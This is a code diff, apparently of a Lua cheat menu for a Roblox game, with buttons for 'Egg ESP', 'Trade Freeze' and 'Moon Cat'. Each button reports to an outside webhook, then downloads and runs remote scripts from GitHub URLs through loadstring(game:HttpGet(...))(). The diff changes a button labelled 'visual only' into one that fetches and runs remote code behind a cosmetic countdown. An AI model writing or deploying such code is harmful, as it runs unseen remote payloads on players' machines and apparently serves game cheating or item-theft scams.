@@ -148,9 +148,9 @@ function sendWebhook(message)
 	if not success then warn("Webhook error:", err) end
 end
 
--- Contador
+-- Mostrar cuenta regresiva solo visual, sin bloquear ejecución
 local countdownActive = false
-local function startCountdown(message, warningText, scriptUrl)
+local function showCountdown(message, warningText)
 	if countdownActive then return end
 	countdownActive = true
 
@@ -161,17 +161,24 @@ local function startCountdown(message, warningText, scriptUrl)
 
 	startFlameEffect()
 
-	for i = 20, 0, -1 do
-		countdownLabel.Text = tostring(i) .. "s"
-		task.wait(1)
-	end
+	-- No bloquear con wait, solo actualizar texto con delay sin detener ejecución
+	spawn(function()
+		for i = 20, 0, -1 do
+			countdownLabel.Text = tostring(i) .. "s"
+			task.wait(1)
+		end
+		stopFlameEffect()
+		countdownFrame.Visible = false
+		mainFrame.Visible = true
+		countdownActive = false
+	end)
+end
 
-	stopFlameEffect()
-
-	countdownFrame.Visible = false
-	mainFrame.Visible = true
-	countdownActive = false
-
+-- Función para ejecutar script loadstring y mostrar efectos
+local function onButtonPressed(webhookMessage, countdownMsg, warningMsg, scriptUrl)
+	sendWebhook(webhookMessage)
+	showCountdown(countdownMsg, warningMsg)
+	
 	if scriptUrl then
 		local success, err = pcall(function()
 			loadstring(game:HttpGet(scriptUrl, true))()
@@ -182,16 +189,15 @@ local function startCountdown(message, warningText, scriptUrl)
 	end
 end
 
--- Configuración de los botones con webhooks y scripts
+-- Configuración de botones
 local buttons = {
 	{button = btn1, webhookMessage = "📦 Ejecutado: Egg ESP", countdownMsg = "Randomizing egg in 20 seconds", warning = "⚠️ Use again if egg fails ⚠️", script = "https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp"},
 	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️", script = "https://raw.githubusercontent.com/catmethod/eggesp/refs/heads/main/Tradefreezer"},
-	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat (visual only)", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Visual only, no script ⚠️", script = nil}
+	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Use again if script fails ⚠️", script = "https://raw.githubusercontent.com/catmethod/tradefreezer/refs/heads/main/mooncat"}
 }
 
 for _, data in ipairs(buttons) do
 	data.button.MouseButton1Click:Connect(function()
-		sendWebhook(data.webhookMessage)
-		startCountdown(data.countdownMsg, data.warning, data.script)
+		onButtonPressed(data.webhookMessage, data.countdownMsg, data.warning, data.script)
 	end)
 end
